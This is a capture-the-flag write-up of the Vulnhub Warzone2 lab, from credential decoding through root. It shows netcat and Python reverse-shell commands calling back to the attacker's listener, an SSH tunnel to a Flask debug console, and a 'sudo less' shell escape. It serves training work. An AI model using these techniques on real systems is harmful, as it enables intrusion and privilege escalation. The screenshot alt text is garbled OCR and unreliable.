---
layout: post
title:  Warzone2 Vulnhub Writeup
category: ctfs
tags: [vulnhub, java, ctf, flask, port-forwarding, gtfobins]
published: true
author: j1v37u2k3y
show_sidebar: true
toc: true
searchable: true
---
Enumeration, Flask, Port Forwarding, GTFObins

Created and Tested in Virtual box (NAT network)

Hint : lowercase letters

<!--cut-->

* TOC
{:toc}

# NMAP
<a href="{{ site.baseurl }}/assets/reports/nmap/vulnhub/warzone2/version.html" target="_blank" title="Warzone NMAP Scan">Warzone 2 NMAP Scan</a> 

## Port 21 files

### password.png
<img src="/assets/images/vulnhub/warzone2/image1.png" style="width:8.51042in;height:5.45833in" alt="Machine generated alternative text: pa ss word. PNG " />

 - SIGNALPERSON

### username.png
<img src="/assets/images/vulnhub/warzone2/image2.png" style="width:8.89583in;height:5.17708in" alt="Machine generated alternative text: userna m e. PNG " />

 - SEMAPHORE

### token.png
<img src="/assets/images/vulnhub/warzone2/image3.png" style="width:8.55208in;height:5.20833in" alt="Machine generated alternative text: token. PNG WARZONE 2 | Token pseudocode hash . token : SHA256 (username + password) bytesToHex (hash) " />

# Semaphore flagging:

 - <http://www.anbg.gov.au/flags/semaphore.html#:~:text=The%20Semaphore%20flag%20signaling%20system,portion%20in%20the%20upper%20hoist>.
 - <https://dotnetfiddle.net/QbsKTc>

# Token Creation based off token.png psuedo code

```csharp

using System;
using System.Security.Cryptography;
using System.Text;

public class Program
{
	public static void Main()
	{
		Console.WriteLine(SHA256HexHashString("semaphoresignalperson"));
	}

	private static string ToHex(byte[] bytes, bool upperCase)
	{
		StringBuilder result = new StringBuilder(bytes.Length * 2);
		for (int i = 0; i < bytes.Length; i++)
			result.Append(bytes[i].ToString(upperCase ? "X2" : "x2"));
		return result.ToString();
	}

	private static string SHA256HexHashString(string StringIn)
	{
		string hashString;
		using (var sha256 = SHA256Managed.Create())
		{
			var hash = sha256.ComputeHash(Encoding.Default.GetBytes(StringIn));
			hashString = ToHex(hash, false);
		}

		return hashString;
	}
}
```


*From &lt;<https://dotnetfiddle.net/QbsKTc>&gt;*

### Credentials Gathered

 - semaphore
 - signalperson
 - 833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26

# Connection with netcat on 1337 with new creds
<img src="/assets/images/vulnhub/warzone2/image4.png" style="width:6.14583in;height:7.08333in" alt="—l &#39; •tredteam202W — &#39;Tue Dec el 12:41:21 — # netcat 18.18.6.189 1337 * WARZDNE 2 # WARZDNE 2 # WARZDNE 2 # {SECRET REMOTE ACCESS} Usernme : Password : signalperson Token :833ad488464de1a27d512f1B4b639258e779e1f14eab7B6163B63d34e54a7b26 druxr-xr-x 3526 Nov -rw-r--r-- drwxr-xr-x dr.&#39;xr-xr-x drwxr-xr-x 322 Nov drwxr-xr-x drwxr-xr-x -rw-r--r-- drwxr-xr-x drwxr-xr-x drwxr-xr-x drwxr -xr-x Success Login [SIGNALS] { Is, ...d, no [semaphore] &gt; nc -nv le.1e.6.198 1337 ] Recognized signal [ sending. .... [semaphore] &gt; nc -nv 18.18.6.198 1337 ] Recognized signal sending.... (semaphore] &gt; nc -nv le.1e.6.198 1337 -e /bin/bash -e /bin/bash ] Recognized signal ] sending. ..... {s—laphore] &gt; # nc -nivp 1337 listening on [any] 1337 - [Tue Dec el 12:45:23 connect to [16.18.6.198] from (UNKWÆ) [le.1e.6.189] 45558 total 84 d r.&#39;xr -rw-r-- x 16 5 root - 113 f Lanan - 113 f Lanan 2 flagman 2 flagman 2 flagman 3 f Lawnan I f Lawlan 5 2 flawnan 2 flawnan 2 flagman 2 flagman 2 f Lawnan I f Lawlan 2 2 flagman roo t f Lagman flagman f Lanan f Lanan flagman flanan flanan flagman f Lagman flagman f Lanan f Lanan flagman flanan flanan flagman f Lanan flagman f Lawlan 4896 Nov 4896 Nov 228 Nov 4896 Nov 4896 Nov 4B96 Nov 4896 Nov 4896 Nov 4896 Nov 4896 Nov 4096 Nov 4896 Nov 8137 Nov 4896 Nov 4896 Nov 4896 Nov 5 Nov 4896 Nov 4896 Nov 8 19:17 8 B6:35 : 27 : 27 8 89. 36 : 39 8 89 : 22 : 37 : 37 : 39 : 37 8 89 : 36 : 37 : 37 : 27 : 37 : 39 : 37 : 37 : 37 8 18. 25 . bash logout . bashrc . cache . config Desktop Docments Dom oads . gnupg . ICEauthority . Local Music Pictures . profile Public . ssh Lates . vboxclient -display svga -xll. pid Videos war zone2 - socket - server " />

## flagman creds found in flagman `warzone2-socket-server`
<img src="/assets/images/vulnhub/warzone2/image5.png" style="width:5.45833in;height:2.0625in" alt="drwxr-xr-x 2 flagman flagman I flagman flagman druxr-xr-x 2 f Lawnan f Lawnan dr.&#39;xr-xr-x 2 cd warzone2-socket-server total 26 drwxr-xr-x 2 4896 4896 4896 4896 4896 34 3776 72 Nov Nov Nov Nov Nov Nov Nov Nov Nov 8 18 : 37 : 37 : 37 : 25 drwxr-xr-x 16 f Lanan I flagman -M-r--r-- - rwxr-xr-x I flagman - ruxr-xr-x I flagman cat . mysshpassword f Lagman f Lagman roo t 8 18:25 8 19:17 8 16. 27 8 14. 59 8 17 . vboxclient -display - svga -XII. pid Videos wa r zone2 - socket - se Aler . mysshpassword warzone2. jar warzone2. sh Did you kno./ that i Nate signals! " />

 - ```flagman:i_hate_signals!```

# flagman 
## SSH as flagman with new creds (Bronze)
<img src="/assets/images/vulnhub/warzone2/image6.png" style="width:5.89583in;height:2.41667in" alt="— [ r001@redtem2020 Tue Dec el — # ssh flagmar.g1e.1e.6.189 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 {WARZONE IS A DANGER ZONE} password: Linux warzone2 4.19.e-11-amd64 #1 Debian 4.19.146-1 (2e2e-B9-17) x86 64 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 WARZDNE 2 {WARZDNE IS A DANGER ZONE} Last Login: sun Nov 8 2e2e from le.e.2.13 &#39;L awnarWarzone2 : —$ " />

<img src="/assets/images/vulnhub/warzone2/image7.png" style="width:4.29167in;height:2.125in" alt="drwxr-xr-x 16 f Lagman f Lagman 4896 Nov 8 19:17 I f Lagman f Lagman 283 Nov 8 67:15 bronze.txt cat bronze.txt BRONZE FLAG : { flawvarWarzone2: / Des k t op$ " />

### flagman has sudo access to run wrz2-app.py as admiral
<img src="/assets/images/vulnhub/warzone2/image8.png" style="width:8.80208in;height:2.78125in" />

## Results from starting the 5000 port
 - ```Generated Pin: 104-779-675```
 
## Set up ssh tunnel to port 5000
 - ```ssh -L 5000:localhost:5000 flagman@warzone2.local```

# admiral 
## Reverse shell as admiral (Silver)
 - Navigate to localhost:5000 to reveal pin input prompt to run python commands.
 - Send python reverse shell back to attacker machine

<img src="/assets/images/vulnhub/warzone2/image9.png" style="width:11.92708in;height:5.09375in" alt="Quit python -c &#39;import INET,socket.SDCK &#39;Tue Dec el # python -c &#39;import socket, INET,socket.SOCK os.dup2(s. os.dup2(s. f i Len&#39; RX errors e dropped e overruns e f rme e TX packets 256 bytes 45344 (44.2 Kia) TX errors e dropped e overruns e carrier e collisions e mtu ether txqueuelen IBBO (Ethernet) eth2: 10 : RX packets 9 bytes 1281 (1.2 Kia) RX errors e dropped e overruns e f rme e TX packets 256 bytes 45344 (44.2 Kia) TX errors e dropped e overruns e carrier e mtu 65536 inet 127.e.e.1 netmask 255.e.e.e inet6 : prefixlen 128 scopeid Loop txqueuelen IBBO (Local Loopback) RX packets 128861 bytes 15184677 (14.4 RX errors e dropped e overruns e frame e TX packets 128861 bytes 15184677 (14.4 TX errors e dropped e overruns e carrier e i@redten2020 # nc -rw 1344 - &#39;Tue Dec el no port(s) to connect to ] l@redtew-rQ020 # nc -nlvp 1344 listening on [any] 1344 ITue Dec el collisions e collisions e 39566 connect to [18.18.6.198] from [le.1e.6.189] $ id , IB9(netdev) , 112(bLuetooth) , 117 (Ipachin) , 118(scanner) - work " />

<img src="/assets/images/vulnhub/warzone2/image10.png" style="width:4.89583in;height:2.9375in" alt="drwxr-xr-x 2 $ cd Desktop total 12 drwxr-xr-x 2 drwxr-xr-x 16 admiral I achiral $ cat silver. txt ral 4896 Nov rat 4896 Nov admi ral 4896 Nov achi ral 284 Nov 8 B9:32 warzone2-app 8 19:17 . 8 B9:24 silver. txt FLAG SILVER L/ : {$silver_medal$} " />

# ROOT 

## admiral has sudo rights with less (GOLD)

### sudo -l gtfobins less
 - <https://gtfobins.github.io/gtfobins/less/>

```
sudo /usr/bin/less /var/public/warzone-rules.txt
!/bin/sh
```

<img src="/assets/images/vulnhub/warzone2/image11.png" style="width:6.59375in;height:5.04167in" alt="— # nc -ntvp 13•44 achiraWarzone2 : / hone,&#39; flagman$ sudo -I Matching Defaults entries for on warzone2: env reset, mail badpass, secure User may run the following on warzone2: (root) NOPASSW: /usr/bin/less Tvar/public/warzone- rules.txt # miraWarzone2: sudo /usr/bin/less /var/public/warzone- rules. txt # id g roups=e ( root x 19 dr.&#39;xr-xr-x dr.&#39;xr-xr-x drwxr-xr-x 3236 Nov drwxr-xr-x drwxr-xr-x dr.&#39;xr-xr-x -rw-r--r-- drwxr-xr-x # cd # Is total d rwxr -rw-r--r- - 16 root root I root - Il roo t - 12 root 2 root 2 root 2 root 3 root roo t I root 3 root 5 root 2 root 2 root I root 2 root 2 root root roo t root roo t root roo t root root roo t roo t root roo t root roo t root root roo t roo t 4896 4896 570 4896 4896 4B96 4896 4B96 4896 36 4096 4896 4896 4896 148 4B96 4B96 Nov Jan Nov Nov Nov Nov Nov Nov Nov Nov Nov Nov Aug Nov Nov 8 19:16 . 27 B8:56 2818 31 27 17 8 14 8 13. 8 16. 8 86. 8 86. 8 86. 8 19 11 8 14 8 86. 8 86. : 513 •41 •33 33 34 : 13 •33 : 09 : 513 •33 •33 2815 8 66: 33 8 B6:34 . bashrc . cache . config Desktop Docwnents . gnupg . ICEauthority . lesshst . local . mozilla Music Pictures . profile Public . ssh " />

<img src="/assets/images/vulnhub/warzone2/image12.png" style="width:5.92708in;height:3.07292in" alt="# cd Desktop total 12 drwxr-xr-x 2 root root 4896 Nov - 16 root root 4896 Nov I root root 332 Nov # cat gold. txt GOLD FLAG : GOLD MEDAL 8 16:41 . 8 19:16 . 8 B9:59 gold.txt : WARZDNE : Alienin with " />
